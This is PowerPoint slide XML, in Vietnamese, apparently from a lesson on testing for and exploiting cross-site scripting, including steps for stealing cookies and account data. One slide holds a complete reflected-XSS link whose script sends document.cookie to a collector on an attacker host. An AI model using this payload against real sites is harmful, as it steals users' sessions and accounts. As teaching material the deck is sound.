                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="17411" name="Picture 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B64A6E85-CA1C-4B78-800F-3002F0B030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66989" y="1914525"/>
            <a:ext cx="6619875" cy="468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64977190"/>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974F07F8-574C-449A-9E13-AAF2446AC812}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2855914" y="188913"/>
            <a:ext cx="4943475" cy="563562"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Kiểm tra lỗi XSS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18435" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{08800195-FA34-4C51-B65F-F1852D209281}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1981200" y="1793876"/>
            <a:ext cx="8229600" cy="5095875"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Verdana" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Dùng tool</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Paros Proxy, WebInspect, Acunetix Web Vulnerability Scanner. Watchfire AppScan….</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Verdana" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Kiểm tra bằng code</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="630658265"/>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C059F898-B856-4F41-9C42-D25314891F14}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1828800" y="304800"/>
            <a:ext cx="7391401" cy="563562"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Kiểm tra lỗi XSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19459" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E23BF45D-74B8-40CF-AA80-9D2A198148BE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Verdana" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Mở Web</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Verdana" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Bắt đầu kiểm tra , định vị 1 ô tìm kiếm hoặc 1 login form</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Verdana" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Chèn code</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> vào</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="19460" name="Picture 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7400F71C-7B24-49B5-A900-A76F03CE5A2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085975" y="2420938"/>
            <a:ext cx="8020050" cy="316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74097926"/>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FEEF7FEE-E762-4901-B430-AA10FACCB2BC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1981200" y="304800"/>
            <a:ext cx="5148263" cy="563562"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Kiểm tra lỗi XSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="20483" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A2C496D9-3449-4EDC-9BB5-CBD2872BD73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790826" y="2257425"/>
            <a:ext cx="7248525" cy="3835400"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20484" name="TextBox 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{35ED96CC-C335-4EB5-97A9-62B66F61EEEE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2790825" y="1484313"/>
            <a:ext cx="31686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en-US" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Kết quả</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1782354307"/>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F8FCCA70-61F8-4E77-9149-29BC08109C1C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3216275" y="160338"/>
            <a:ext cx="4356100" cy="563562"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Khai thác lỗi XSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="21507" name="Content Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9EAC801B-28F6-4806-BE90-92150721A0A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609850" y="1590676"/>
            <a:ext cx="6972300" cy="4371975"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21508" name="AutoShape 2" descr="xss.png">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F1000177-A2C7-48CB-A197-E65BD3BA1448}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="167957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endParaRPr lang="en-US" altLang="en-US" sz="1800"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2011299324"/>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039E61DF-E791-41A8-B27E-0089E2D0A7CE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3359150" y="260351"/>
            <a:ext cx="4294188" cy="563563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Khai thác lỗi XSS</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" altLang="en-US">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D9D93C1-C09D-4CB1-BA5A-4FAD7DEB05BB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Các bước thực hiện</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200" algn="just">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Hacker biết được người dùng đang sử dụng một ứng dụng Web có lỗ hổng XSS.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200" algn="just">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Người dùng nhận được 1 liên kết thông qua email hay trên chính trang Web</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:schemeClr val="tx2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200" algn="just">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Chuyển nội dung thông tin (cookie, tên, mật khẩu…) về máy chủ của hacker.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200" algn="just">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Hacker tạo một chương trình cgi hoặc một trang Web để ghi nhận những thông tin đã đánh cắp vào 1 tập tin.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200" algn="just">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Sau khi nhận được thông tin cần thiết, hacker có thể sử dụng để thâm nhập vào tài khoản của người dùng.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:schemeClr val="tx2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3961579867"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:transition spd="slow"/>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C5F8D4DC-DBF2-42F3-A665-DC850290B46F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3124200" y="457200"/>
            <a:ext cx="4222750" cy="563562"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Khai thác lỗi XSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{43977CCC-F60C-4E90-BD42-49DE1F60C71F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2514600" y="1676400"/>
            <a:ext cx="8229600" cy="4808537"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Các cách thực hiện</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Lấy cookies</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Lấy account</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="773526993"/>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F1762611-1AA3-45FA-94DD-D28BE5D198CD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3359151" y="104776"/>
            <a:ext cx="4511675" cy="563563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Khai thác lỗi XSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3820159D-D29F-46B3-AFFA-1C323D9CAF80}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="10515600" cy="2593975"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Lấy cookies</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Tạo một file info.txt và upload lên host. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Tạo file cookie.php upload file này lên host.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:schemeClr val="tx2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:schemeClr val="tx2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:schemeClr val="tx2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 3.   để lại một link:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>http://www.vulnerable.site/welcome.cgi?name=&lt;script&gt;window.open(“http://www.attacker.site/collect.cgi?cookie=”%2Bdocument.cookie)&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:schemeClr val="tx2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="24580" name="Picture 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B6B85925-E891-4DB2-93CB-5DA25E9BA5B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495550" y="2349501"/>
            <a:ext cx="4464050" cy="223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7745236"/>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96926B3E-140A-43B5-B2AE-76531821B554}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3792539" y="188913"/>
            <a:ext cx="4149725" cy="563562"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Khai thác lỗi XSS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{812D0925-024D-4B15-8A66-9D1E80BF05B3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
